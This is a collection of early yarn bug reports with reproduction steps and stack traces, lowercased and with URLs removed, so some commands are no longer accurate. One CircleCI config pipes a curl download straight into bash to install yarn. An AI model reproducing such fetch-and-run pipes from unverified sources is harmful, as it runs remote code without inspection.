running `yarn upgrade` to upgrade a dev dependency, even with the `--dev` flag, will add the upgraded version of the dependency to the `dependencies` hash in `package.json` rather than `devdependencies`
this might also be an issue with other dependency types (like peer), but i have not tested
**if the current behavior is a bug, please provide the steps to reproduce.** ``` bash
$ mkdir foo && cd foo
$ yarn init
$ yarn add lodash@3 --dev
<snip> $ grep lodash package.json -c 1 "devdependencies": { "lodash": "3" } $ yarn outdated
yarn outdated v0.16.1
package current wanted latest
lodash 3.10.1 3.10.1 4.16.4 $ yarn upgrade lodash --dev
success saved 1 new dependency
lodash@4.16.4 $ grep lodash package.json -c 1 "devdependencies": { "lodash": "3" },
-- "dependencies": { "lodash": "^4.16.4" }
if you run `yarn` as root for its first run: for example: `sudo yarn --version`
then yarn creates `~/.yarn` and `~/.yarn/.roadrunner.json` with the permissions and ownership like so: ```
drwxr-xr-x 2 root root 4096 oct 20 13:25 .yarn
and: -rw-r--r-- 1 root root 112183 oct 24 18:05 .roadrunner.json
``` subsequent runs of yarn as a normal user fail because they cannot read .roadrunner.json: ```
$ yarn --version
/usr/lib/node_modules/yarn/bin/yarn.js:47 throw err; ^ error: eacces: permission denied, open '/home/vagrant/.yarn/.roadrunner.json' at error (native) at object.fs.opensync (fs.js:549:18) at object.fs.writefilesync (fs.js:1156:15) at /usr/lib/node_modules/yarn/node_modules/roadrunner/index.js:25:6 at /usr/lib/node_modules/yarn/node_modules/roadrunner/index.js:12:12 at emitone (events.js:82:20) at process.emit (events.js:169:7) at processemit [as emit] (/usr/lib/node_modules/yarn/node_modules/loud-rejection/node_modules/signal-exit/index.js:140:35) at process.exit (node.js:750:17) at command.<anonymous> (/usr/lib/node_modules/yarn/node_modules/commander/index.js:825:13)
``` **if the current behavior is a bug, please provide the steps to reproduce.** `sudo npm install -g yarn`
`sudo yarn --version`
`yarn --version`
installing `yarn` without having `ca-certificates` installed produces this error: ```
+ yarn add react
yarn add v0.16.0
info no lockfile found.
[1/4] resolving packages...
error an unexpected error occured, please open a bug report with the information provided in "/tmp/yarntest/yarn-error.log".
info visit for documentation about this command.
root@291a7c28dd47:/data# cat /tmp/yarntest/yarn-error.log
arguments: /usr/bin/nodejs /usr/share/yarn/bin/yarn.js add react path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin yarn version: 0.16.0 node version: 4.2.6 platform: linux x64 npm manifest: no manifest yarn manifest: no manifest bower manifest: no manifest lockfile: no lockfile trace: error: unable to get local issuer certificate at error (native) at tlssocket.<anonymous> (_tls_wrap.js:1016:38) at emitnone (events.js:67:13) at tlssocket.emit (events.js:166:7) at tlssocket._finishinit (_tls_wrap.js:585:8)
``` **if the current behavior is a bug, please provide the steps to reproduce.** ```
docker run -it ubuntu:16.04
``` then inside docker container: ```
apt-key adv --keyserver pgp.mit.edu --recv d101f7899d41f3c3
echo "deb stable main" > /etc/apt/sources.list.d/yarn.list
apt-get update -y
apt-get install yarn -y
mkdir yarntest
cd yarntest
yarn add react
global packages installation doesn't work
**if the current behavior is a bug, please provide the steps to reproduce.** i installed `yarn` package via `sudo dnf install yarn` ``` sh
~> echo $path
/usr/local/bin /usr/local/sbin /usr/bin /usr/sbin /home/joseluis/.composer/vendor/bin /home/joseluis/.composer/vendor/bin /home/joseluis/.node/bin /home/joseluis/.yarn/bin ~> yarn global add surge
yarn global v0.16.0
warning no license field
[1/4] resolving packages...
warning surge > fstream-ignore > minimatch@2.0.10: please update to minimatch 3.0.2 or higher to avoid a regexp dos issue
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
success installed surge@0.18.0 with binaries: - surge
error an unexpected error occured, please open a bug report with the information provided in "/home/joseluis/.yarn-config/global/yarn-error.log".
info visit for documentation about this command
~> tail -n 4 /home/joseluis/.yarn-config/global/yarn-error.log trace: error: eacces: permission denied, unlink '/usr/bin/surge' at error (native) ```
`yarn add --exact ` installs latest npm version instead of the specified commit and fork
**if the current behavior is a bug, please provide the steps to reproduce.** ```
yarn add --exact grep suite node_modules/react-native-userdefaults-ios/readmd.md # shouldn't be empty
can not remove scoped package from node_modules, ex: ``` shell
yarn remove @types/graphql
``` **if the current behavior is a bug, please provide the steps to reproduce.**
first, install a scoped package,ex: ``` shell
yarn add @types/graphql
``` then remove it ``` shell
yarn remove @types/graphql
``` the package remains in the node_modules folder
when installing an optionaldependency that fails in a "install" script (such as an incompatible native dependency) the module folder is left behind in the node_modules directory **if the current behavior is a bug, please provide the steps to reproduce.** make a new package.json that depends on the "mouse-forward-back" module as an optional dependency and run `yarn` on a windows machine
i'm installing angular-cli with yarn global.
when running `ng --version` the result is ```
d:\\users\\xxx>"$basedir/d:/users/xxx/appdata/local/yarn/config/global/node_modules/.bin/ng.cmd" "$@"
the filename, directory name, or volume label syntax is incorrect.
``` **if the current behavior is a bug, please provide the steps to reproduce.**
- `yarn global add angular-cli`
- `ng --version`
after running yarn pack tgz file contains everything, including source, images, etc
even files marked as gitignore
**if the current behavior is a bug, please provide the steps to reproduce.**
just run yarn pack
if a transitive dependency version is specified using `x` (e.g
`3.x.x`) in multiple dependencies (and inconsistently, sometimes 'x') then lowercase and uppercase version are sorted randomly in the lockfile
this results in unwanted changes to the `yarn.lock` file (and git marking it dirty) **if the current behavior is a bug, please provide the steps to reproduce.** ``` sh
git clone
yarn rm -rf node_modules && yarn
``` repeat the last step a few times and you should see the yarn.lock file changing even if it doesn't need to.
published tarball contains invalid data (namely the folders `dist`, `node_modules`, `package` and the file `.eslintignore`)
i unpublished already, but unpkg.com has already some stuff cached:
(done with yarn)
**if the current behavior is a bug, please provide the steps to reproduce.**
`yarn version` and entered 0.8.1 `yarn publish` and did not enter a version but just pressed enter on the version prompt.
when trying to upgrade a dependency listed on devdependencies yarn adds the new version as a duplicate in dependencies example output after `yarn upgrade babel-eslint` ``` sh
"dependencies" has dependency "babel-eslint" with range "^7.0.0" that collides with a dependency in "devdependencies" of the same name with version "^6.1.0"
``` **if the current behavior is a bug, please provide the steps to reproduce.** have some dep (i.e
'foo') on devdependecies then: ``` sh
yarn upgrade foo
yarn is very buggy, slow while running
and the progress bar auto line breaks itself looks ugly
**if the current behavior is a bug, please provide the steps to reproduce.**
yarn install / yarn upgrade
randomly error and cannot execute global installed package (ex: tslint) ``` ts
c:\\users\\myname>yarn global ls
yarn global v0.15.1
warning no license field done in 0.05s
c:\\users\\myname>yarn global add tslint
yarn global v0.15.1
warning no license field
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
warning unmet peer dependency "typescript@>=1.7.3".
[4/4] building fresh packages...
success installed tslint@3.15.1 with binaries: - tslint
done in 2.67s
c:\\users\\myname>yarn global add typescript
yarn global v0.15.1
warning no license field
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
error enoent: no such file or directory, open 'c:\\users\\myname\\appdata\\local\\yarn\\.global\ ode_modules\\balanced-match\\.np mignore' at error (native)
info visit for documentation about this command
c:\\users\\myname>yarn global add typescript
yarn global v0.15.1
warning no license field
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
success installed typescript@2.0.3 with binaries: - tsc - tsserver
done in 2.89s
c:\\users\\myname>yarn global ls
yarn global v0.15.1
warning no license field
error enoent: no such file or directory, open 'c:\\users\\myname\\appdata\\local\\yarn\\.global\ ode_modules\\balanced-match\\.npmignore' at error (native)
info visit for documentation about this command
c:\\users\\myname>yarn global ls
yarn global v0.15.1
warning no license field
info tslint@3.15.1 has binaries: - tslint
info typescript@2.0.3 has binaries: - tsc - tsserver
done in 1.61s
c:\\users\\myname>tslint
< no output, because it forces exiting my cmd >
``` **if the current behavior is a bug, please provide the steps to reproduce.**
try to install a global package, and execute it.
the yarn.lock file has changes between different developers systems, with small differences
mostly they seem to be ordering differences
**if the current behavior is a bug, please provide the steps to reproduce.**
check yarn.lock file into source repository
tell all developers we're moving to yarn, that they have to update everything
developers get modification notices from git that yarn.lock has changed and are unsure what to do because they're not front end developers
see differences sample below
these are all transitive dependencies from the package.json root
reviewing the differences, it seems that yarn isn't fully deterministic in ordering when generating the yarn.lock file, as the ultimate content is identical, but the pack ordering and the version ordering for a package shows differences.
package.json ``` json
{ "dependencies": { "devbridge-autocomplete": "^1.2.26", "jquery": "2.1.2" }
``` will install: ``` yaml
devbridge-autocomplete: version "1.2.26" resolved " #e491e01b701ba0ff509afaf4ee1eca69a9d00647" dependencies: jquery ">=1.7" jquery@>=1.7: version "3.1.1" resolved " #347c1c21c7e004115e0a4da32cece041fad3c8a3" jquery@2.1.2: version "2.1.2" resolved " #b68f154cb2ea4731924883e9fe20ec199d1dc1e2" ```
`yarn run` fails to load executable scripts that are local to the `node_modules` folder **if the current behavior is a bug, please provide the steps to reproduce.**
`npm i -g storybook`
(inside a project dir) `getstorybook`
`npm run storybook` <-- works fine
`yarn run storybook` <-- bails with error <img width="885" alt="screen shot 2016-10-17 at 09 20 39" src=" ">
if you restore .yarn-cache from another machine (e.g
on a ci system) that had a globally installed package, then running `yarn global add <pkg>` doesn't install the package on the new machine
**if the current behavior is a bug, please provide the steps to reproduce.**
set up a circle.yml file that tells circleci to cache ~/.yarn-cache
run a build and then run it again (make sure in the "restore cache" step that `home/ubuntu/.yarn-cache` is restored)
the second time around, even though `yarn global add codecov` runs successfully and says `success installed codecov@1.0.1 with binaries: codecov`, the `codecov` package is missing
it doesn't place anything in nvm's global `node_modules` folder nor the `bin` folder
machine: pre: - mkdir ~/.yarn-cache node: version: 6 dependencies: cache_directories: - ~/.yarn-cache pre: - curl -o- -l | bash - yarn global add codecov override: - yarn test: pre: - yarn run lint override: - yarn test -- --coverage post: - codecov
`yarn cache clean` removes also dependencies that have been installed with `yarn global add` before
**if the current behavior is a bug, please provide the steps to reproduce.** ``` console
yarn global add lerna
lerna --version # prints version
yarn cache clean
lerna --version # fails
the `package.json` for yarn itself has this `devdependency`: ``` "devdependencies": { "eslint-plugin-yarn-internal": "file:scripts/eslint-rules", }
``` as part of building the distribution tarball, we run `npm pack`, extract the resulting tarball, run `npm install --production` to install just the prod dependencies, then archive the resulting files (see `build-dist.sh` and `build-dist.ps1`)
`scripts/eslint-rules` is only needed for dev builds and not for production builds, and we **don't** want to distribute it with yarn,, so we do not copy it into the `dist` directory
`npm install --production` is fine with that, while `yarn install --production` complains: ```
yarn install --production
yarn install v0.15.1
[1/4] resolving packages...
error "c:\\\\src\\\\yarn\\\\dist\\\\scripts\\\\eslint-rules" doesn\'t exist.
info visit for documentation about this command.
``` **if the current behavior is a bug, please provide the steps to reproduce.**
`git clone modify`scripts/build-dist.ps1`(on windows) or`scripts/build-dist.sh`to run`yarn install --production`rather than`npm install --production`, watch it fail.
running `yarn pack` on yarn itself takes around 200 seconds on my machine
on the other hand, `npm pack` runs within a few seconds
**if the current behavior is a bug, please provide the steps to reproduce.** ```
git clone
npm install
npm run build
currently, running `yarn run build` outputs yarn's version and the command `npm-watch` (in my case)
if an error occurs during the watch process, there is no way to identify it
![yarn-bug-1]( **what is the desired behavior?** the output should be shown like it is when running the same command via the windows command prompt
**please mention your node.js, yarn and operating system version.** node 4.2.6; yarn 0.15.1; git 2.9.2 64-bit; windows 10
- `save-exact = true` from .npmrc file is not respected,
- ~~(workaround) setting `save-prefix` to `''` (empty string) results in adding `undefined<pkg.version>` to `package.json` file when running `yarn add <package>` due to empty string being a false value,~~ **if the current behavior is a bug, please provide the steps to reproduce.**
- create `.npmrc` file in project directory, add `save-exact = true` line to it,
- ~~(workaround) and/or: run `yarn config set save-prefix ''`~~
node modules installed versions **if the current behavior is a bug, please provide the steps to reproduce.**
when using npm as package manager if i use @next as a version (for example `npm install --save koa@next`) it installs the correct version
running `yarn outdated` output is another version (yarn.lock displays the correct and currently @next version installed instead)
package current wanted latest
koa-router 7.0.1 7.0.1 5.4.0 koa 2.0.0 2.0.0 1.2.4 ```
fs.js:549 return binding.open(pathmodule._makelong(path), stringtoflags(flags), mode); ^ error: eacces: permission denied, open '/root/.yarn-cache/.global/node_modules/arr-flatten/index.js' at error (native) at object.fs.opensync (fs.js:549:18) at object.fs.readfilesync (fs.js:397:15) at object.module._extensions..js (module.js:415:20) at module.load (module.js:343:32) at function.module._load (module.js:300:12) at module.require (module.js:353:17) at require (internal/module.js:12:17) at object.<anonymous> (/root/.yarn-cache/.global/node_modules/arr-diff/index.js:10:15) at module._compile (module.js:409:26)
``` **if the current behavior is a bug, please provide the steps to reproduce.**
sudo npm i -g yarn
sudo yarn global add gulp
if an optionaldependency install script fails, the whole 'yarn install' fails.
with npm client, these errors are ignored and the install succeeds
**if the current behavior is a bug, please provide the steps to reproduce.**
the sinopia npm package has an optionaldependency on fs-ext, whose install script fails in windows
this is a known issue, but since it is optional the errors get ignored with 'npm install'; but fails with 'yarn'
in a windows machine:
yarn add sinopia this happens even if ignore-optional=true.
if ignore-scripts=true, error goes away.
running `yarn` or any `yarn` command throws this error: ```
yarn install v0.15.1
info no lockfile found.
error typeerror: cannot read property 'name' of null at stringifyperson (/usr/local/cellar/yarn/0.15.1/libexec/lib/node_modules/yarn/lib/util/normalize-manifest/util.js:25:13) at normalizeperson (/usr/local/cellar/yarn/0.15.1/libexec/lib/node_modules/yarn/lib/util/normalize-manifest/util.js:72:22) at /usr/local/cellar/yarn/0.15.1/libexec/lib/node_modules/yarn/lib/util/normalize-manifest/fix.js:107:65 at next (native) at step (/usr/local/cellar/yarn/0.15.1/libexec/lib/node_modules/yarn/node_modules/babel-runtime/helpers/asynctogenerator.js:17:30) at /usr/local/cellar/yarn/0.15.1/libexec/lib/node_modules/yarn/node_modules/babel-runtime/helpers/asynctogenerator.js:28:20
info visit for documentation about this command.
``` **if the current behavior is a bug, please provide the steps to reproduce.** `brew update`
`brew install yarn`
yarn installs to a user's or root's home folder, and links to that folder from `/usr/bin`.
since on most linux only the current user has access to it's home folder, only the user who run the install command can use the globally installed bin utils
for anyone else they get permission denied errors when trying to run the globally installed bin util.
if the file being loaded is a zip, the error `invalid tar file` is returned **if the current behavior is a bug, please provide the steps to reproduce.**
save this into bower.json ```
{ "name": "app", "version": "0.0.1", "dependencies": { "bootstrap": " " },
``` and run `yarn`
take the following package.json: ```
{ "dependencies": { "babel-core": "6.17.0" }, "devdependencies": { "eslint": "3.3.1" }
``` running `yarn install` leads to the following yarn.lock yarn ls tells me the following if i remove node_modules and then run `yarn install --production`, i will end up with a situation where `escape-string-regexp` is missing, even though it's a dependency of babel-core, through babel-code-frame->chalk->escape-string-regexp
when request with --har, the resolve step will be hang
**if the current behavior is a bug, please provide the steps to reproduce.**
yarn install --har
when i install packages using `yarn install --flat` and run a check afterwards `yarn check`, i get a number of issues reported
i'm not 100% if this is related to which i can test when this fix will be released
i tried `yarn install` before and after the flat instal in different example runs but the issue was persistent **if the current behavior is a bug, please provide the steps to reproduce.**
- `yarn install --flat`
- `yarn check`
when performing any operation with yarn (add for instance) it errors with: ```
eperm: operation not permitted, open 'c:\\foo\ ode_modules\\firebase\\app-node.js'
at error (native)
``` **if the current behavior is a bug, please provide the steps to reproduce.**
use windows :(
failure to fix the issue, right click the node_modules folder and un-check "read-only"
re-run yarn command
now it works, like magic! after yarn is done, all files are back to being read-only though.
installing typed packages and then adding a new package removes the typed packages
**if the current behavior is a bug, please provide the steps to reproduce.**
`yarn add @types/node`
notice that `node_modules/@types/node` exists
`yarn add inversify-inject-decorators`
notice that `node_modules/@types/node` no longer exists
`yarn outdated` can't find `@types/react` package (or any `@types/*` package)
**if the current behavior is a bug, please provide the steps to reproduce.** ```
$ yarn add @types/react
$ yard outdated
yarn outdated v0.15.1
error not found at request.params.callback [as _callback] (/usr/lib/node_modules/yarn/lib/util/request-manager.js:273:18) at request.self.callback (/usr/lib/node_modules/yarn/node_modules/request/request.js:187:22) at emittwo (events.js:106:13) at request.emit (events.js:191:7) at request.<anonymous> (/usr/lib/node_modules/yarn/node_modules/request/request.js:1048:10) at emitone (events.js:96:13) at request.emit (events.js:188:7) at incomingmessage.<anonymous> (/usr/lib/node_modules/yarn/node_modules/request/request.js:969:12) at emitnone (events.js:91:20) at incomingmessage.emit (events.js:185:7)
info visit for documentation about this command.
`yarn` breaks work
**if the current behavior is a bug, please provide the steps to reproduce.**
add into `package.json` the following line: `"benderjs-coverage": "benderjs/benderjs-coverage#t/4",`
run the `yarn`.
i have a local module that is referenced by path in my application's package.json, e.g: ```
"co-main": "file:../companymodules/base/co-main/"
``` that `co-main` module depends on another company module that is reside an other directory
so in `co-main`'s package.json has this: ```
"co-utils": "file:../co-utils"
``` so, for the better understanding, the directory structure is the following: ```
|- dev |- mycoolapplication (co-main referenced there) |- companymodules |- base |- co-main (here lies co-main that references utils with file:../co-utils) |- co-utils
``` `npm install` runs fine, but `yarn install` fails with the following: ```
error "c:\\\\dev\\\\co-utils" doesn\'t exist.
``` so the bug is obvious, yarn resolves co-main's relative path by using the main package.json's path (c:\\dev\\mycoolapplication), but npm uses the submodule's root path for relative resolution (c:\\dev\\companymodules\\base\\co-main)
**if the current behavior is a bug, please provide the steps to reproduce.**
create an environment described above
run `npm install`, it gets succeeded
run `yarn install`, it gets failed with the above error
when using yarn with [lerna]( the default concurrency is 4
apparently yarn does not like concurrent installs, it fails with lots of errors in the cache: ```
error enoent: no such file or directory, utime '/root/.yarn-cache/npm-ak-editor-prosemirror-2.3.2/package.json' at error (native)
[ak-editor-plugin-mentions] [2/4] fetching packages...sed: write error
error enotempty: directory not empty, rmdir '/root/.yarn-cache/npm-ak-editor-schema-2.4.0' at error (native)
``` they are kinda random based on the current execution order but always happen: #!/results/%7bd6caae96-c5a0-44b9-90cf-676525874320%7d **if the current behavior is a bug, please provide the steps to reproduce.** use yarn in a lerna repo: `lerna exec -- yarn install`
$ time yarn
yarn install v0.15.1
info no lockfile found.
[1/4] resolving packages...
error typeerror: cannot use 'in' operator to search for '^2.1.0' in undefined at /home/danilovaz/.nvm/versions/node/v6.7.0/lib/node_modules/yarn/lib/resolvers/registries/npm-resolver.js:62:24 at next (native) at step (/home/danilovaz/.nvm/versions/node/v6.7.0/lib/node_modules/yarn/node_modules/babel-runtime/helpers/asynctogenerator.js:17:30) at /home/danilovaz/.nvm/versions/node/v6.7.0/lib/node_modules/yarn/node_modules/babel-runtime/helpers/asynctogenerator.js:35:14 at promise.f (/home/danilovaz/.nvm/versions/node/v6.7.0/lib/node_modules/yarn/node_modules/core-js/library/modules/_export.js:35:28) at /home/danilovaz/.nvm/versions/node/v6.7.0/lib/node_modules/yarn/node_modules/babel-runtime/helpers/asynctogenerator.js:14:12 at function.findversioninregistryresponse (/home/danilovaz/.nvm/versions/node/v6.7.0/lib/node_modules/yarn/lib/resolvers/registries/npm-resolver.js:72:7) at /home/danilovaz/.nvm/versions/node/v6.7.0/lib/node_modules/yarn/lib/resolvers/registries/npm-resolver.js:89:34 at next (native) at step (/home/danilovaz/.nvm/versions/node/v6.7.0/lib/node_modules/yarn/node_modules/babel-runtime/helpers/asynctogenerator.js:17:30)
info visit for documentation about this command.
yarn 1,57s user 0,13s system 23% cpu 7,294 total
``` **if the current behavior is a bug, please provide the steps to reproduce.**
i just do: `time yarn` i'm using _ember_ and my package.json is default: ``` json
{ "name": "myproject", "version": "0.6.3", "description": "", "private": true, "directories": { "doc": "doc", "test": "tests" }, "scripts": { "build": "ember build", "start": "ember server", "test": "ember test" }, "repository": "", "engines": { "node": ">= 0.10.0" }, "author": "", "license": "mit", "devdependencies": { "autoprefixer": "^6.3.6", "broccoli-asset-rev": "^2.2.0", "broccoli-clean-css": "^1.1.0", "ember-ajax": "0.7.1", "ember-cli": "2.6.0", "ember-cli-app-version": "^1.0.0", "ember-cli-babel": "^5.1.5", "ember-cli-base64-converter": "0.1.3", "ember-cli-dependency-checker": "^1.2.0", "ember-cli-facebook-js-sdk": "1.0.3", "ember-cli-htmlbars": "^1.0.1", "ember-cli-htmlbars-inline-precompile": "^0.3.1", "ember-cli-inject-live-reload": "^1.3.1", "ember-cli-mirage": "0.2.0", "ember-cli-moment-shim": "2.0.0", "ember-cli-qunit": "^1.2.1", "ember-cli-release": "0.2.8", "ember-cli-sri": "^2.0.0", "ember-cli-stylus": "^1.0.6", "ember-cli-uglify": "^1.2.0", "ember-data": "^2.6.0", "ember-disable-proxy-controllers": "^1.0.1", "ember-dragula": "1.9.3", "ember-export-application-global": "^1.0.4", "ember-load-initializers": "^0.5.0", "ember-moment": "7.0.0-beta.3", "ember-perfectscroll": "^0.1.0", "ember-power-select": "1.0.0-alpha.1", "ember-radio-button": "1.0.7", "ember-resolver": "^2.0.3", "ember-simple-auth": "1.1.0", "ember-websockets": "3.0.0", "emberx-file-input": "1.1.0", "gulp": "^3.9.1", "gulp-concat": "^2.6.0", "gulp-cssnano": "^2.1.2", "gulp-group-css-media-queries": "^1.1.0", "gulp-postcss": "^6.1.0", "gulp-sourcemaps": "^1.6.0", "liquid-fire": "0.23.1", "liquid-tether": "1.1.1", "loader.js": "^4.0.0", "lost": "^6.8.0", "phantomjs-prebuilt": "^2.1.6", "postcss-font-awesome": "^0.2.1", "poststylus": "^0.2.3", "rupture": "^0.6.1" }, "dependencies": { "ember-cli-stylus": "^1.0.6", "rucksack-css": "^0.8.6" }
if `cwd` is a subdirectory of `$home`, `.npmrc` and `.yarnrc` files will be read multiple times and in the wrong order
this is because of [these lines]( #l89-l93)
before that block, `possibilities` will be `[global, home, local]`
but after that block, `possibilities` will be `[global, home, local, local, ..., home, ...]` with possibilites from intermediate directories (if any)
this is incorrect
not only will the config files be read multiple times, but values from `home` will override those from `local` because it read last
one solution might be as follows: 1) populate `possibilities` with `[global, home]` initially
2) look for local files starting with `cwd`, but add them in reverse order such that a file located in `cwd` is _last_ in the `possibilities` array
3) only add a config file if it is not already contained in the array that way we avoid unnecessary reading/parsing and the values have the correct precedence
**if the current behavior is a bug, please provide the steps to reproduce.**
- in `$home/.npmrc` set `registry= `
- in `$home/repo/.npmrc` set `registry= `
- in `$home/repo` run `yarn` requests will be pulled from ` `.
cannot to a `yarn` **if the current behavior is a bug, please provide the steps to reproduce.**
![image]( **please mention your node.js, yarn and operating system version.**
node 6.7.0 64bit
an unlinked (but added) package is missing from node_modules and yarn will not install
**if the current behavior is a bug, please provide the steps to reproduce.**
link a random package ``` git clone git@github.com:tj/co.git cd co && yarn link ``` as a side note, yarn will not install the package's dependencies
the default npm client would do that
i'm not sure whether that's expected or not given that the linking process is slightly different already.
create a new directory and use the linked package from there ``` yarn link co ```
add the package again but this time via `add` ``` yarn add co ``` the linked package is still used at this point (and that's consistent with the default client).
unlink the package ``` yarn unlink co ``` this will remove the link from node_modules as expected.
run yarn to get the added (locked) package back ``` yarn yarn install v0.15.1 warning no license field success already up-to-date
done in 0.13s
ls node_modules ``` at this point, the package is not present in node_modules but yarn seems to be okay with that and won't install it
doing `yarn add co` again _will_ install it.
it seems that all native packages are rebuilt every time yarn is asked to either add a new package or just install the currently locked
**if the current behavior is a bug, please provide the steps to reproduce.**
add some native packages
yarn add leveldown bcrypt
run yarn again and observe that both of the packages will be rebuilt for no reason
``` the same happens when adding a completely unrelated packages which, as far as i can tell, cannot affect the native packages in any way
yarn add co
when running `yarn pack` it runs for several minutes and then i get the following error: ```
buffer.js:440 throw new error('tostring failed'); ^ error: tostring failed at buffer.tostring (buffer.js:440:11) at fsreqwrap.readfileafterclose [as oncomplete] (fs.js:378:21)
``` **if the current behavior is a bug, please provide the steps to reproduce.** run `yarn pack` on our project
i understand the error doesn't give much to go on
if there is some way to get a more detailed error message we'd be happy to rerun the command and provide more details.
yarn doesn't work on ubuntu 14.04 lts **if the current behavior is a bug, please provide the steps to reproduce.**
- use ubuntu 14.04 lts
- install yarn
- try to run yarn it shows up this error ```
/home/ludo237/.npm-global/lib/node_modules/yarn/bin/yarn.js:48 throw err; ^ error: einval: invalid argument, uv_interface_addresses at error (native) at object.isoffline (/home/ludo237/.npm-global/lib/node_modules/yarn/lib/util/network.js:13:25) at object.<anonymous> (/home/ludo237/.npm-global/lib/node_modules/yarn/lib/util/request-manager.js:46:54) at module._compile (module.js:556:32) at object.module._extensions..js (module.js:565:10) at module.load (module.js:473:32) at trymoduleload (module.js:432:12) at function.module._load (module.js:424:3) at module.require (module.js:483:17) at require (internal/module.js:20:19)
`yarn install` in a project with both a `package.json` and `bower.json` will only install `npm` dependencies.
unable to install package globally **if the current behavior is a bug, please provide the steps to reproduce.** `yarn global add pm2` ```
c:\\>yarn global add pm2
yarn global v0.15.1
warning no license field
[1/4] resolving packages...
[2/4] fetching packages...
warning fsevents@1.0.14: the platform "win32" is incompatible with this module.
info "fsevents@1.0.14" is an optional dependency and failed compatibility check
excluding it from installation.
[3/4] linking dependencies...
error enoent: no such file or directory, open 'c:\\users\\***\\appdata\\local\\yarn\\.global\ ode_modules\\abbrev\\abbrev.js' at error (native)
info visit for documentation about this command.
if a project has a scoped dependency in package.json, and that dependency has a `bin` attr, the install fails with the following message: ```
yarn install v0.15.1
info no lockfile found.
[1/4] resolving packages...
[2/4] fetching packages...
warning fsevents@1.0.14: the platform "linux" is incompatible with this module.
info "fsevents@1.0.14" is an optional dependency and failed compatibility check
excluding it from installation.
[3/4] linking dependencies...
error enoent: no such file or directory, symlink '../../@redfin/codecov/cli.js' -> '/tmp/yarn-temp/node_modules/.bin/@redfin/codecov' at error (native)
info visit for documentation about this command.
``` the `../..` seems suspect, because the package is actually three directories under node_modules due to the scope in this case
**if the current behavior is a bug, please provide the steps to reproduce.** see above.
`yarn pack` ignores files specified in `.gitignore` while `npm pack` does not
when `.js` files are generated from another language or flavor of javascript, generated files are often not checked-in and thus `*.js` or `**/*.js` entry is added to `.gitignore`
these generated files should be included in the package at runtime
**if the current behavior is a bug, please provide the steps to reproduce.**
create `index.js` file at project root.
create `.gitignore` file at project root with entry `*.js`.
run `yarn pack`.
decompress package `.tgz` file.
`index.js` file will not be in the decompressed package, only `package.json` and `node_modules`.
from npm with respect to `npm run`: `in addition to the shell's pre-existing path, npm run adds node_modules/.bin to the path provided to scripts
any binaries provided by locally-installed dependencies can be used without the node_modules/.bin prefix.` **if the current behavior is a bug, please provide the steps to reproduce.** add additional entry to the `scripts` section of the `package.json` without installing the dependency globally (in this case mocha)
``` "scripts": { "test-api": "mocha test/api" },
currently, it looks like `yarn --offline --no-lockfile` isn't properly resolving scoped packages in the local cache
running with `--offline`, but _without_ `--no-lockfile` does not seem to exhibit this behavior
**if the current behavior is a bug, please provide the steps to reproduce.** in a project that includes scoped dependencies:
- `yarn --no-lockfile` (make sure the cache is populated)
- `rm -rf node_modules`
- `yarn --no-lockfile --offline` (try to install packages based solely on disk cache) error example: ```
error couldn\'t find any versions for "@redfin/actions" that matches "<version>" in our cache
possible versions: ""
``` that package does exist in the cache, afaict: ```
$ ls -l ~/.yarn-cache/npm-@redfin/actions-<version>
package.json
<other package files>
running `yarn` on repo shows: ```
error typeerror: cannot read property 'endswith' of undefined at removesuffix (/users/zach/.yarn/lib/util/misc.js:42:14) at function.parserefs (/users/zach/.yarn/lib/util/git.js:447:55) at /users/zach/.yarn/lib/util/git.js:376:24 at next (native) at step (/users/zach/.yarn/node_modules/babel-runtime/helpers/asynctogenerator.js:17:30) at /users/zach/.yarn/node_modules/babel-runtime/helpers/asynctogenerator.js:28:20
``` **if the current behavior is a bug, please provide the steps to reproduce.** run `yarn` to install deps.
when the package.json contains scoped packages like `@types/node` the `yarn cache ls` command fails with the follow error: ```
yarn cache v0.15.0
error enoent: no such file or directory, open 'c:\\users\\grant.patten\\appdata\\local\\yarn\ pm-@types\\.yarn-metadata.json' at error (native)
info visit for documentation about this command.
``` **if the current behavior is a bug, please provide the steps to reproduce.**
install `@types/node` (`yarn add @types/node`)
run `yarn cache ls`
supplying an unrecognized flag to yarn results in yarn fetching and installing packages
**if the current behavior is a bug, please provide the steps to reproduce.**
install `yarn`
change to directory with a `package.json`
run `yarn --vesrion` yarn will read the `package.json` file and fetch packages as if you had simply run `yarn`.
running `yarn` in a repo containing a dependency using the `bitbucket:reponame` syntax results in a typeerror
error typeerror: cannot read property 'split' of undefined at function.parserefs (/usr/local/lib/node_modules/yarnpkg/lib/util/git.js:439:25) at /usr/local/lib/node_modules/yarnpkg/lib/resolvers/exotics/hosted-git-resolver.js:138:50 at next (native) at step (/usr/local/lib/node_modules/yarnpkg/node_modules/babel-runtime/helpers/asynctogenerator.js:17:30) at /usr/local/lib/node_modules/yarnpkg/node_modules/babel-runtime/helpers/asynctogenerator.js:28:20 at process._tickcallback (internal/process/next_tick.js:103:7)
``` **if the current behavior is a bug, please provide the steps to reproduce.**
- add a dependency with `bitbucket:reponame` syntax
- run `yarn`
`yarn check` fails if there is no lockfile in the directory, `yarn install` doesn't create on if there are no dependencies in the package.json
**if the current behavior is a bug, please provide the steps to reproduce.** ```
yarn install
yarn check # fails
when i install [johnny-five]( it's [optional dependency]( #l139) [serialport]( with a native module (using node-pre-gyp) is missing from `node_modules`, but installing serialport directly works fine
**if the current behavior is a bug, please provide the steps to reproduce.** using this package.json file: ``` json
{ "name": "yarntest", "version": "1.0.0", "description": "", "main": "index.js", "scripts": { "test": "echo \\"error: no test specified\\" && exit 1" }, "dependencies": { "johnny-five": "^0.10.0" }, "author": "", "license": "isc"
`yarn cache clean`
`rm yarn.lock`
`yarn install`
`cd node_modules`
-name serialport` returns nothing but, using this package.json file: ``` json
{ "name": "yarntest", "version": "1.0.0", "description": "", "main": "index.js", "scripts": { "test": "echo \\"error: no test specified\\" && exit 1" }, "dependencies": { "serialport": "^4.0.0" }, "author": "", "license": "isc"
`yarn cache clean`
`rm yarn.lock`
`yarn install`
`cd node_modules`
-name serialport` shows it has been installed
